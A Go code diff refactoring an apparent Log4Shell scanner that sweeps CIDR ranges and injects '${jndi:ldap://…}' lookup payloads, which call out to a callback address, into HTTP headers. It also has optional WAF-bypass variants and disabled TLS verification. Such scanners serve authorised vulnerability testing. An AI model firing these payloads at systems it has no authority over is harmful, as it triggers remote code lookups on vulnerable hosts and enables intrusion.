@@ -1,4 +1,4 @@
-package main
+package internal
 
 import (
 	"bytes"
@@ -23,24 +23,15 @@ const (
 	darwinUserAgent  = "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
 )
 
-var (
-	DefaultUserAgent string
-)
-
-func request(ctx context.Context, cfg *config) error {
-	log.Printf("[i] Start scanning CIDR %s\n---------", cfg.cidr)
+func Request(ctx context.Context, opts *RemoteOptions) error {
+	log.Printf("[i] Start scanning CIDR %s\n---------", opts.CIDR)
 
 	transport := http.DefaultTransport.(*http.Transport).Clone()
 	transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 
 	transport.Proxy = http.ProxyFromEnvironment
-	if cfg.proxy != "" {
-		proxyURL, err := url.Parse(cfg.proxy)
-		if err != nil {
-			return err
-		}
-
-		transport.Proxy = http.ProxyURL(proxyURL)
+	if len(opts.Proxies) == 1 { // TODO Allow more than one proxy
+		transport.Proxy = http.ProxyURL(opts.Proxies[0])
 	}
 
 	client := &http.Client{
@@ -48,9 +39,7 @@ func request(ctx context.Context, cfg *config) error {
 		Transport: transport,
 	}
 
-	ports := strings.Split(cfg.ports, ",")
-
-	_, ipv4Net, err := net.ParseCIDR(cfg.cidr)
+	_, ipv4Net, err := net.ParseCIDR(opts.CIDR)
 	if err != nil {
 		return err
 	}
@@ -61,13 +50,13 @@ func request(ctx context.Context, cfg *config) error {
 	finish := (start & mask) | (mask ^ 0xffffffff)
 
 	for i := start; i <= finish; i++ {
-		payloads, err := createPayloads(cfg)
+		payloads, err := createPayloads(opts)
 		if err != nil {
 			return err
 		}
 
 		for _, p := range payloads {
-			header, err := createHTTPHeader(cfg, p)
+			header, err := createHTTPHeader(opts, p)
 			if err != nil {
 				return err
 			}
@@ -75,13 +64,15 @@ func request(ctx context.Context, cfg *config) error {
 			ip := make(net.IP, 4)
 			binary.BigEndian.PutUint32(ip, i)
 
-			for _, p := range ports {
-				u := fmt.Sprintf("%s://%s:%s", cfg.schema, ip, p)
+			for _, p := range opts.Ports {
+				u := fmt.Sprintf("%s://%s:%s", opts.Schema, ip, p)
 
-				log.Printf("[i] Checking %s\n", u)
+				if opts.Verbose {
+					log.Printf("[i] Checking %s\n", u)
+				}
 
 				var req *http.Request
-				switch cfg.requestType {
+				switch opts.RequestType {
 				case "get":
 					req, err = http.NewRequestWithContext(ctx, "GET", u, nil)
 					if err != nil {
@@ -137,16 +128,10 @@ func request(ctx context.Context, cfg *config) error {
 		}
 	}
 
-	log.Printf("[i] Completed scanning of CIDR %s\n", cfg.cidr)
-	if cfg.listen {
-		log.Println("[i] Waiting for incoming callbacks!")
-		log.Println("[i] Use ctrl+c to stop the program.")
-	}
-
 	return nil
 }
 
-func createHTTPHeader(cfg *config, payload string) (*http.Header, error) {
+func createHTTPHeader(opts *RemoteOptions, payload string) (*http.Header, error) {
 	data, err := f.ReadFile("resource/header.txt")
 	if err != nil {
 		return nil, err
@@ -156,10 +141,20 @@ func createHTTPHeader(cfg *config, payload string) (*http.Header, error) {
 
 	header := &http.Header{}
 
-	header.Set("User-Agent", DefaultUserAgent)
+	var userAgent string
+	switch runtime.GOOS {
+	case "windows":
+		userAgent = windowsUserAgent
+	case "darwin":
+		userAgent = darwinUserAgent
+	default:
+		userAgent = defaultUserAgent
+	}
+
+	header.Set("User-Agent", userAgent)
 
 	for _, h := range keys {
-		if h == "User-Agent" && !cfg.noUserAgentFuzzing {
+		if h == "User-Agent" && !opts.NoUserAgentFuzzing {
 			header.Set("User-Agent", payload)
 			continue
 		}
@@ -174,10 +169,10 @@ func createHTTPHeader(cfg *config, payload string) (*http.Header, error) {
 	return header, nil
 }
 
-func createPayloads(cfg *config) ([]string, error) {
-	payloads := []string{fmt.Sprintf("${jndi:ldap://%v/l4s}", cfg.caddr)}
+func createPayloads(opts *RemoteOptions) ([]string, error) {
+	payloads := []string{fmt.Sprintf("${jndi:ldap://%v/l4s}", opts.CADDR)}
 
-	if cfg.wafBypass {
+	if opts.WafBypass {
 		t, err := template.ParseFS(f, "resource/bypass.txt")
 		if err != nil {
 			return nil, err
@@ -185,7 +180,7 @@ func createPayloads(cfg *config) ([]string, error) {
 
 		var buf bytes.Buffer
 		if err := t.Execute(&buf, map[string]string{
-			"CADDR":    cfg.caddr,
+			"CADDR":    opts.CADDR,
 			"Resource": "l4s",
 		}); err != nil {
 			return nil, err
@@ -204,15 +199,4 @@ func readFields() ([]string, error) {
 	}
 
 	return strings.Split(string(data), "\n"), nil
-}
-
-func init() {
-	switch runtime.GOOS {
-	case "windows":
-		DefaultUserAgent = windowsUserAgent
-	case "darwin":
-		DefaultUserAgent = darwinUserAgent
-	default:
-		DefaultUserAgent = defaultUserAgent
-	}
 }
